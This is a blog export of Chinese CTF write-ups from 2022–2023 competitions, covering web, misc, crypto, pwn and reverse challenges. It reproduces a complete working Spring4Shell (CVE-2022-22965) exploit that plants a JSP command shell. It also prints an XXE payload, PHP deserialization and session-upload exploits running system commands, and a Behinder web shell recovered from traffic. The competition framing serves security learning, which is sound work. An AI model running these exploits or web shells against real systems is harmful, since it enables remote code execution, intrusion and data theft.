00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00+%00%00%00%22%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%006%00%00%00%3B%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00n%00%00%00o%00%00%00n%00%00%00e%00%00%00x%00%00%00i%00%00%00s%00%00%00t%00%00%00e%00%00%00n%00%00%00t%00%00%00%2F%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3B%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00%3E%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00L%00%00%00E%00%00%00M%00%00%00E%00%00%00N%00%00%00T%00%00%00+%00%00%00a%00%00%00a%00%00%00+%00%00%00%28%00%00%00b%00%00%00b%00%00%00%27%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%25%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00%5D%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00r%00%00%00o%00%00%00o%00%00%00t%00%00%00%3C%00%00%00%2F%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00

miscWelcome_to_QGBV2VsY29tZV90b19RR0I=base64解码得到Welcome_to_QGB
找找GIF伪加密，09-&gt;00，取出aaa
aaa添加后缀png，修改高度，得到压缩包密码：okv90D%&amp;ffgbd
解压得到bbb，添加gif头GIF89a，得到flag

大佬大佬lsb提取出png

修改高度得到flag

The fun picture爆破得到密码gh89

FUN添加后缀zip，解压后文件补上png头89 50 4e 47,得到二维码
扫码得到ZmxhZ3tycjkwZm5uZW1kZnUwOGdma2ttdmVtZGszZm12NmZnYX0=
base64解码得到flag
B@tCh赛后复现
BatchEncryption混淆的批处理文件
特征一般是开头的两个字节为0xFF、0xFE，存在类似BatchEncryption Build 201610 By gwsbhqt@163.com的作者信息
本题将作者信息去除了

解密脚本，来自https://blog.csdn.net/Hunter98234/article/details/108672926
#!/usr/bin/python# -*- coding: utf-8 -*-## Batch Decryption 202009 (BatchEncryption Build 201610)#import osdef decryption(data):    if not (data[0] == 0xFF and data[1] == 0xFE):        print(&#x27;Batch decryption bom error!&#x27;)        return    if str(data[2:9], encoding=&quot;utf-8&quot;) != &#x27; &amp;cls\r\n&#x27;:        print(&#x27;Batch decryption cls error!&#x27;)        return    if str(data[9:60], encoding=&quot;utf-8&quot;) != &#x27;::BatchEncryption Build 201610 By gwsbhqt@163.com\r\n&#x27;:        print(&#x27;Batch decryption build error!&#x27;)        return    vars = &#123;&#125;    # decryption line    i = 60    l = len(data)    while i &lt; l:        i = run(vars, data, i)def run(vars, data, i):    buf = &#x27;&#x27;    f = 0    t = 0    x = False    l = len(data)    while(True):        if data[i] == 0x0d and data[i+1] == 0x0a:            i += 2            break        # get %var:~x,y% %0        if data[i] == 0x25:            if not x:                x = True                f = i            else:                x = False                t = i                rst = var_percent(data[f:t+1], vars)                buf += rst        else:            if not x:                buf += str(data[i:i+1], encoding=&quot;utf-8&quot;)            else:                if (f + 1 == i) and ((data[i] &gt;= 0x30 and data[i] &lt;= 0x39) or data[i] == 0x2a):                    x = False                    t = i                    rst = str(data[f:t+1], encoding=&quot;utf-8&quot;)                    buf += rst        i += 1        if i &gt;= l:            break    #    print(buf)    bufs = buf.split(&#x27;&amp;@&#x27;)    for var in bufs:        if var[0:4] == &#x27;set &#x27;:            var = var[4:]            b = var.find(&#x27;=&#x27;)            vars[var[0:b]] = var[b+1:].replace(&#x27;^^^&#x27;, &#x27;^&#x27;)    return idef var_percent(data, vars):    full = str(data, encoding=&quot;utf-8&quot;)    buf = full[1:len(full)-1]    buf = buf.split(&#x27;:~&#x27;)    var = buf[0]    if not var in vars:        vars[var] = os.getenv(var)    ent = vars[var]    if (len(buf) &gt; 1):        l = len(ent)        buf = buf[1].split(&#x27;,&#x27;)        f = int(buf[0])        t = int(buf[1])        if f &lt; 0:            f, t = l + f, t        rst = ent[f: f+t]    else:        rst = full    return rstencrypt_file = &#x27;./batch_decryption/Encrypted_01.txt&#x27;if __name__ == &#x27;__main__&#x27;:    try:        file = open(encrypt_file, &quot;rb&quot;)        data = file.read()    except Exception as err:        print(&#x27;Batch decryption read error:&#x27;, err)        exit    else:        file.close()    decryption(data)

修改下脚本，使它能适用于本题
因为附件中没有Build 201610 By....这串信息，所以将个判断去掉（17-19）没有这个字符串后，bat内容也会从相应的60变为9（从@开始）

95行改为文件名

运行解密得到flag

pwnqqjs_new非预期解
ida分析，看到import * as std from &#39;std&#39;和import * as os from &#39;os&#39;

所以输入os会返回模块中的函数发现存在readdir，可以读目录

找到flag文件位置/home/ctf/flag

std模块中存在loadFile函数，可以读文件

读flag

cryptobabyRSA赛后复现
import gmpy2import libnumimport osfrom Crypto.Util.number import *from gmpy2 import next_primeimport hashlibp=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977q=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731e=33c=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919n = p*qd = gmpy2.invert(11, (p - 1) * (q - 1))c3 = pow(c, d, n)print(c3)i = 0while True:    i += 1    m, flag = gmpy2.iroot(c3, 3)    print(i)    if flag:        print(hex(m))        exit()    c3 = c3 + n]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>强国杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022强国杯技术技能大赛东部晋级赛wp</title>
    <url>/posts/82e1297c/</url>
    <content><![CDATA[Rank：13，被打爆了
webmd5_php&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);highlight_file(__file__);if (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       show_source(&#x27;le.php&#x27;);   else       die(&quot;快了解MD5&quot;);&#125;else&#123;    die(&quot;MMMMDDDD5555&quot;);&#125;?&gt;
md5弱比较，找一个加密前后都是0e开头的值
传入?md5=0e215962017
拿到le.php的源码
&lt;?php$file = $_GET[&#x27;file&#x27;];if(isset($file))&#123;    if( strpos( $file, &quot;good&quot; ) !==  false || strpos( $file, &quot;luck&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;        include ($file . &#x27;.php&#x27;);    &#125;    else&#123;        echo &quot;Sorry, we currently only support flag and luck.&quot;;    &#125;&#125;?&gt;

传入的值中要包含good，luck或者index
用伪协议读内容，用index/../flag绕过判断
最后传入?file=php://filter/convert.base64-encode/resource=index/../flag拿到flag
命令执行通过报错页面得知是spring
github搜最新的spring rce
通过CVE-2022-22965的POCgetshell
# Author: @Rezn0k# Based off the work of p1n93rimport requestsimport argparsefrom urllib.parse import urlparseimport time# Set to bypass errors if the target site has SSL issuesrequests.packages.urllib3.disable_warnings()post_headers = &#123;    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;get_headers = &#123;    &quot;prefix&quot;: &quot;&lt;%&quot;,    &quot;suffix&quot;: &quot;%&gt;//&quot;,    # This may seem strange, but this seems to be needed to bypass some check that looks for &quot;Runtime&quot; in the log_pattern    &quot;c&quot;: &quot;Runtime&quot;,&#125;def run_exploit(url, directory, filename):    log_pattern = &quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20&quot; \                  f&quot;java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter&quot; \                  f&quot;(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B&quot; \                  f&quot;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&quot;    log_file_suffix = &quot;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&quot;    log_file_dir = f&quot;class.module.classLoader.resources.context.parent.pipeline.first.directory=&#123;directory&#125;&quot;    log_file_prefix = f&quot;class.module.classLoader.resources.context.parent.pipeline.first.prefix=&#123;filename&#125;&quot;    log_file_date_format = &quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;    exp_data = &quot;&amp;&quot;.join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times    # If re-running the exploit, this will create an artifact of &#123;old_file_name&#125;_.jsp    file_date_data = &quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_&quot;    print(&quot;[*] Resetting Log Variables.&quot;)    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)    print(&quot;[*] Response code: %d&quot; % ret.status_code)    # Change the tomcat log location variables    print(&quot;[*] Modifying Log Configurations&quot;)    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)    print(&quot;[*] Response code: %d&quot; % ret.status_code)    # Changes take some time to populate on tomcat    time.sleep(3)    # Send the packet that writes the web shell    ret = requests.get(url, headers=get_headers, verify=False)    print(&quot;[*] Response Code: %d&quot; % ret.status_code)    time.sleep(1)    # Reset the pattern to prevent future writes into the file    pattern_data = &quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=&quot;    print(&quot;[*] Resetting Log Variables.&quot;)    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)    print(&quot;[*] Response code: %d&quot; % ret.status_code)def main():    parser = argparse.ArgumentParser(description=&#x27;Spring Core RCE&#x27;)    parser.add_argument(&#x27;--url&#x27;, help=&#x27;target url&#x27;, required=True)    parser.add_argument(&#x27;--file&#x27;, help=&#x27;File to write to [no extension]&#x27;, required=False, default=&quot;shell&quot;)    parser.add_argument(&#x27;--dir&#x27;, help=&#x27;Directory to write to. Suggest using &quot;webapps/[appname]&quot; of target app&#x27;,                        required=False, default=&quot;webapps/ROOT&quot;)    file_arg = parser.parse_args().file    dir_arg = parser.parse_args().dir    url_arg = parser.parse_args().url    filename = file_arg.replace(&quot;.jsp&quot;, &quot;&quot;)    if url_arg is None:        print(&quot;Must pass an option for --url&quot;)        return    try:        run_exploit(url_arg, dir_arg, filename)        print(&quot;[+] Exploit completed&quot;)        print(&quot;[+] Check your target for a shell&quot;)        print(&quot;[+] File: &quot; + filename + &quot;.jsp&quot;)        if dir_arg:            location = urlparse(url_arg).scheme + &quot;://&quot; + urlparse(url_arg).netloc + &quot;/&quot; + filename + &quot;.jsp&quot;        else:            location = f&quot;Unknown. Custom directory used. (try app/&#123;filename&#125;.jsp?cmd=id&quot;        print(f&quot;[+] Shell should be at: &#123;location&#125;?cmd=id&quot;)    except Exception as e:        print(e)if __name__ == &#x27;__main__&#x27;:    main()



PHP反序列化2源码
&lt;?phpclass main&#123;    protected $ClassObj;    function __construct()&#123;        $this-&gt;ClassObj = new easy();    &#125;    function __destruct()&#123;        $this-&gt;ClassObj-&gt;action();    &#125;&#125;class easy&#123;    function action()&#123;        echo &quot;hello Hacker&quot;;    &#125;&#125;class evil&#123;    private $file;    function action()&#123;        eval($this-&gt;file);    &#125;&#125;if(isset($_GET[&#x27;a&#x27;]))&#123;    $a = $_GET[&#x27;a&#x27;];    if(stristr($a,&#x27;eval&#x27;)!==False)&#123;        die(&#x27;Hacker&lt;/br&gt;&#x27;);    &#125;elseif (stristr($a,&#x27;flag&#x27;)!==False) &#123;        die(&#x27;Hacker&lt;/br&gt;&#x27;);    &#125;else&#123;        unserialize($_GET[&#x27;a&#x27;]);    &#125;&#125;else &#123;    $user  = new main();    highlight_file(__FILE__);&#125;?&gt;


exp
&lt;?phpclass main&#123;	protected $ClassObj;	function __construct()&#123;		$this-&gt;ClassObj = new evil();	&#125;&#125;class evil&#123;	private $file = &#x27;system(&quot;cat /fla*&quot;);&#x27;;&#125;$user = new main();echo urlencode(serialize($user));?&gt;




phpti字符串逃逸
class a&#123;    public $uname;    public $password;    public function __construct($uname,$password)    &#123;        $this-&gt;uname=$uname;        $this-&gt;password=$password;    &#125;    public function __wakeup()    &#123;        if($this-&gt;password===&#x27;admin&#x27;)        &#123;            include &quot;r11.php&quot;;        &#125;        else &#123;            echo &quot;hacker\n&quot;;        &#125;    &#125;&#125;function filter($string)&#123;    return str_replace(&#x27;phpinfo()&#x27;,&#x27;phpinfo()up&#x27;,$string);&#125;$uname=$_GET[&#x27;admin&#x27;]$password=123456;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);

?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;&#125;
flag.php
class admin&#123;    public $root;    function __destruct()    &#123;        echo $this-&gt;root;        echo &quot;3123123123123\n&quot;;          if ($this-&gt;root ===&#x27;print_r(scandir(dirname(__FILE__)));&#x27;)        &#123;            echo &quot;123412341234&quot;;        &#125;    &#125;    function __toString()&#123;        return &quot;aaaaaaaa&quot;;    &#125;&#125;

exp
POST /flag.php HTTP/1.1Host: host:portContent-Length: 369Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7Pufxj5tsIY9p2yAUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=n480589952d85l2vvkeb01sh9gConnection: close------WebKitFormBoundary7Pufxj5tsIY9p2yAContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;123------WebKitFormBoundary7Pufxj5tsIY9p2yAContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;admin\&quot;:1:&#123;s:4:\&quot;root\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;Content-Type: text/plain------WebKitFormBoundary7Pufxj5tsIY9p2yA--


misc不要被迷惑筛选http协议的包，找到flag.zip

导出压缩包后爆破密码，得到123321
得到一串jjencode编码字符
$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$$$$+(![]+&quot;&quot;)[$._$_]+$.$_$_+&quot;\\&quot;+$.__$+$.$__+$.$$$+&quot;&#123;\\&quot;+$.__$+$._$_+$.$$$+&quot;\\&quot;+$.__$+$.__$+$.__$+&quot;\\&quot;+$.__$+$.$_$+$.$_$+$._+&quot;\\&quot;+$.__$+$.__$+$._$_+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$.__$+&quot;\\&quot;+$.__$+$._$_+$._$$+&quot;\\&quot;+$.__$+$.__$+$.$$_+&quot;\\&quot;+$.__$+$._$_+$.___+&quot;\\&quot;+$.__$+$.$_$+$.___+(![]+&quot;&quot;)[$._$_]+&quot;\\&quot;+$.__$+$.___+$.$_$+&quot;\\&quot;+$.__$+$.$$$+$.__$+&quot;\\&quot;+$.__$+$.$_$+$.__$+$.$$_$+&quot;\\&quot;+$.__$+$.__$+$.$__+&quot;\\&quot;+$.__$+$.___+$._$_+&quot;\\&quot;+$.__$+$.$_$+$.$$_+&quot;\\&quot;+$.__$+$.$$$+$.___+&quot;\\&quot;+$.__$+$.$$_+$._$$+&quot;\\&quot;+$.__$+$._$_+$.$$_+&quot;\\&quot;+$.__$+$.___+$.$$_+&quot;\\&quot;+$.__$+$._$_+$._$_+&quot;\\&quot;+$.__$+$._$$+$.__$+$.__+&quot;\\&quot;+$.__$+$.$_$+$._$$+&quot;\\&quot;+$.__$+$.$$_+$.$$$+&quot;\\&quot;+$.__$+$.__$+$._$$+&quot;\\&quot;+$.__$+$._$$+$.___+&quot;\\&quot;+$.__$+$.___+$.$__+$._$+&quot;&#125;&quot;+&quot;\&quot;&quot;)())();


PCAP文件分析flag.pcapng找到没用的flag.zip
02.pcapng提取出一个02.zip，一个2.png
2.png上看到压缩包密码Vu8#fI9，解压得到flag2.png
修改flag2.png高度得到flag

平正开赛后复现
每一位取反后加一
f=open(&#x27;aaa&#x27;,&#x27;rb&#x27;)d=f.read()f=open(&#x27;1.zip&#x27;,&#x27;wb&#x27;)for i in d:    if ord(i)==0:        f.write(&#x27;\x00&#x27;)        continue    print((ord(i)^0xff)+1,ord(i))    f.write(chr((ord(i)^0xff)+1))f.close()

伪加密后得到一串社会主义核心价值观加密字符串，解密得到flag
reversere2先用pyinstxtractor解包，找到test_obfuscated.pyc，反编译，得到源代码
import pygameimport sysimport timeimport randomdifficulty = 25frame_size_x = 720frame_size_y = 480check_errors = pygame.init()pygame.display.set_caption(&#x27;Lets Play&#x27;)game_window = pygame.display.set_mode((frame_size_x, frame_size_y))black = pygame.Color(0, 0, 0)white = pygame.Color(255, 255, 255)red = pygame.Color(255, 0, 0)green = pygame.Color(0, 255, 0)blue = pygame.Color(0, 0, 255)fps_controller = pygame.time.Clock()snake_pos = [    100,    50]snake_body = [    [        100,        50],    [        90,        50],    [        80,        50]]f_body = [    [        40,        29],    [        40,        30],    ...    ...    ...    [        624,        38]]food_pos = [    random.randrange(1, frame_size_x // 10) * 10,    random.randrange(1, frame_size_y // 10) * 10]food_spawn = Truedirection = &#x27;RIGHT&#x27;change_to = directionscore = 0def game_over():    OOOO000000O000OO0 = pygame.font.SysFont(&#x27;times new roman&#x27;, 90)    O000O0OO0OO0O0O0O = OOOO000000O000OO0.render(&#x27;YOU DIED&#x27;, True, red)    OOO00OO00O0O00O00 = O000O0OO0OO0O0O0O.get_rect()    OOO00OO00O0O00O00.midtop = (frame_size_x / 2, frame_size_y / 4)    game_window.fill(black)    game_window.blit(O000O0OO0OO0O0O0O, OOO00OO00O0O00O00)    show_score(0, red, &#x27;times&#x27;, 20)    pygame.display.flip()    time.sleep(3)    pygame.quit()    sys.exit()def show_score(OO00000O0O000OO0O, O0O0O0OOOO000O000, O0O0000O00OO00OO0, O0O000OOOOOO00O0O):    O00O000000OO0O0OO = pygame.font.SysFont(O0O0000O00OO00OO0, O0O000OOOOOO00O0O)    O0O0O0O0O0O00O00O = O00O000000OO0O0OO.render(&#x27;Score : &#x27; + str(score), True, O0O0O0OOOO000O000)    O000O0OOOO000OO0O = O0O0O0O0O0O00O00O.get_rect()    if OO00000O0O000OO0O == 1:        O000O0OOOO000OO0O.midtop = (frame_size_x / 10, 15)    else:        O000O0OOOO000OO0O.midtop = (frame_size_x / 2, frame_size_y / 1.25)    game_window.blit(O0O0O0O0O0O00O00O, O000O0OOOO000OO0O)for event in pygame.event.get():    if event.type == pygame.QUIT:        pygame.quit()        sys.exit()    elif event.type == pygame.KEYDOWN:        if event.key == pygame.K_UP or event.key == ord(&#x27;w&#x27;):            change_to = &#x27;UP&#x27;        if event.key == pygame.K_DOWN or event.key == ord(&#x27;s&#x27;):            change_to = &#x27;DOWN&#x27;        if event.key == pygame.K_LEFT or event.key == ord(&#x27;a&#x27;):            change_to = &#x27;LEFT&#x27;        if event.key == pygame.K_RIGHT or event.key == ord(&#x27;d&#x27;):            change_to = &#x27;RIGHT&#x27;        if event.key == pygame.K_ESCAPE:            pygame.event.post(pygame.event.Event(pygame.QUIT))if change_to == &#x27;UP&#x27; and direction != &#x27;DOWN&#x27;:    direction = &#x27;UP&#x27;if change_to == &#x27;DOWN&#x27; and direction != &#x27;UP&#x27;:    direction = &#x27;DOWN&#x27;if change_to == &#x27;LEFT&#x27; and direction != &#x27;RIGHT&#x27;:    direction = &#x27;LEFT&#x27;if change_to == &#x27;RIGHT&#x27; and direction != &#x27;LEFT&#x27;:    direction = &#x27;RIGHT&#x27;if direction == &#x27;UP&#x27;:    snake_pos[1] -= 10if direction == &#x27;DOWN&#x27;:    snake_pos[1] += 10if direction == &#x27;LEFT&#x27;:    snake_pos[0] -= 10if direction == &#x27;RIGHT&#x27;:    snake_pos[0] += 10snake_body.insert(0, list(snake_pos))if snake_pos[0] == food_pos[0] and snake_pos[1] == food_pos[1]:    score += 1    food_spawn = Falseelse:    snake_body.pop()if score == 1000:    game_window.fill(black)    for pos in f_body:        pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 1, 1))    pygame.display.flip()    time.sleep(10)elif not food_spawn:    food_pos = [        random.randrange(1, frame_size_x // 10) * 10,        random.randrange(1, frame_size_y // 10) * 10]food_spawn = Truegame_window.fill(black)for pos in snake_body:    pygame.draw.rect(game_window, green, pygame.Rect(pos[0], pos[1], 10, 10))pygame.draw.rect(game_window, white, pygame.Rect(food_pos[0], food_pos[1], 10, 10))if snake_pos[0] &lt; 0 or snake_pos[0] &gt; frame_size_x - 10:    game_over()if snake_pos[1] &lt; 0 or snake_pos[1] &gt; frame_size_y - 10:    game_over()for block in snake_body[1:]:    if snake_pos[0] == block[0] and snake_pos[1] == block[1]:        game_over()show_score(1, white, &#x27;consolas&#x27;, 20)pygame.display.update()fps_controller.tick(difficulty)continue


通过f_body变量中储存的坐标画图得到flag
from PIL import Imageimg=Image.new(&#x27;1&#x27;,(1000,1000))f_body=[...]for i in f_body:    img.putpixel(tuple(i),255)img.show()


]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>强国杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2023台州市第三届网络安全大赛wp</title>
    <url>/posts/8779ab40/</url>
    <content><![CDATA[webbriefphp&lt;!--&lt;a href=&quot;/?source&quot;&gt;source&lt;/a&gt;--&gt;&lt;?php if (isset($_GET[&#x27;source&#x27;])) highlight_file(__FILE__)  ?&gt;&lt;?php    error_reporting(0);    include(&#x27;./shell.php&#x27;);    if (isset($_GET[&#x27;file&#x27;])) &#123;        $content = file_get_contents($_GET[&#x27;file&#x27;]);        if (strpos($content, &#x27;&lt;!DOCTYPE&#x27;) === False) &#123;            die(&#x27;failed to read&#x27;);        &#125;        else &#123;            echo $content;            die();        &#125;    &#125;    else &#123;            die(&#x27;nothing here&#x27;);    &#125;?&gt; nothing here

只能读取以&lt;!DOCTYPE开头的文件，直接用php_filter_chain_generator构造

读取shell.php

然后文件包含转命令执行

蚁剑连接拿到flag
misc这是神马流量分析，导出http对象
&lt;?php@error_reporting(0);session_start();	$key=&quot;144a6b2296333602&quot;;	$_SESSION[&#x27;k&#x27;]=$key;	session_write_close();	$post=file_get_contents(&quot;php://input&quot;);	if(!extension_loaded(&#x27;openssl&#x27;))	&#123;		$t=&quot;base64_&quot;.&quot;decode&quot;;		$post=$t($post.&quot;&quot;);		for($i=0;$i&lt;strlen($post);$i++) &#123;    			 $post[$i] = $post[$i]^$key[$i+1&amp;15];    			&#125;	&#125;	else	&#123;		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);	&#125;    $arr=explode(&#x27;|&#x27;,$post);    $func=$arr[0];    $params=$arr[1];	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;    @call_user_func(new C(),$params);?&gt;

拿到key后解密冰蝎流量
其中一条流量中发现命令cd /var/www/html/upload/../;tar -czvf - flag | openssl des3 -salt -k th1sisKey -out ./flag.tar.gz

生成openssl des3 -salt -k th1sisKey -in ./flag.tar.gz -d -out out.tar.gz

解压得到🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅✉🚰🚹🎤💧📂👑🚫ℹ🍴😎ℹ🚨📮🛩🥋🥋🔪☀🌉😡👑😂🌊⌨🚪🚹😎🎈💧🕹💧🏎☃ℹ☃🔪🍌✅😇🍍⌨🌿💧🌊🎅☂⏩🌊🍵📮☀💵⌨☂📮😇☂🐍😆☀🚪🚹🍵💧🌏🚫😆🐘🐅😀🚰🐍🙃💧🗒🗒 
使用th1sisKey密钥解emoji-aes得到flag
李先生的计算机2.ad1文件，使用FTK Imager挂载
根据提示直接找邮件存储位置MailMasterData

拿到search.db文件，用db browser查看
得到转账金额600和附件密码dbt_1126_tta

jpg加密软件密码123654

附件可以在MailMasterData下或download目录下找到

解压后得到BorromeanIslands.jpg，jphs解密后得到银行卡号6222025567723373838
DASCTF&#123;600_6222025567723373838&#125;
Black Mambaiend后有冗余数据，提取出来后异或24
f=open(&#x27;1&#x27;,&#x27;rb&#x27;)d=f.read()f=open(&quot;output.zip&quot;,&#x27;wb&#x27;)for i in d:    f.write(bytes([i^24]))f.close()

异或后是压缩包，hint是说了很多次不要用这么常见的密码了
掏出祖传的字典爆破，得到1qaz@WSX

解压后是
EAOJYU?TRX&gt;&#123;XPFABY&#123;8&#123;24+有人好像对我键盘做了点手脚，看起来像坏了一样。

Dvorak解码得到DASCTF&#123;KOBE_BRYANT_8_24&#125;
